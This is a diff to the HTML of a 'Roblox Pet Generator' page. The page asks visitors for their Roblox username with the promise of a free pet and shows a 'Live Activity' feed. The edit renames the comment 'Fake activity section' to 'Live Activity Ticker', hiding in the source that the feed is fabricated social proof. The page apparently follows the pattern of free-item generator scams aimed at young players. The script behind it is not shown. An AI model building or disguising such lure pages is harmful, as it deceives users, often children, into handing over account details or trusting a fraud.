@@ -1,29 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Roblox Pet Generator</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
+  <!-- Generator Panel -->
   <div class="container">
     <h1>🌙 Roblox Pet Generator</h1>
     <p class="subtitle">Enter your Roblox username to generate a pet!</p>
 
-    <input type="text" id="username" placeholder="Enter Roblox Username">
-    <button onclick="startGenerator()">Check Username</button>
+    <input type="text" id="username" placeholder="Enter Roblox Username" />
+    <button id="checkBtn" onclick="startGenerator()">Check Username</button>
 
     <div id="profile"></div>
-    <div id="loading"></div>
     <div id="result"></div>
     <div id="serverButton"></div>
   </div>
 
-  <!-- Fake activity section -->
+  <!-- Live Activity Ticker -->
   <div class="feed-container">
     <h2>⚡ Live Activity</h2>
-    <div id="activityFeed"></div>
+    <div id="activityFeed" aria-live="polite"></div>
   </div>
 
   <script src="app.js"></script>
